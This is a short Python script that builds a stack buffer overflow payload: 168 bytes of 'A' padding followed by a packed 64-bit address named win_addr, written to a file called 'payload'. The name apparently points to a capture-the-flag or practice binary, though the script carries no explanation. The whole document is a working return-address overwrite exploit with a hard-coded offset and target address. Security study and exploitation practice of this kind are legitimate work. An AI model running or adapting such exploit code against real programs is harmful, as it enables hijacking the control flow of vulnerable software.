import struct

offset   = 168
win_addr = 0x104e8

payload  = b'A' * offset
payload += struct.pack('<Q', win_addr)

with open('payload', 'wb') as f:
    f.write(payload)

print(f"Payload length: {len(payload)} bytes")
print(f"Payload hex: {payload.hex()}")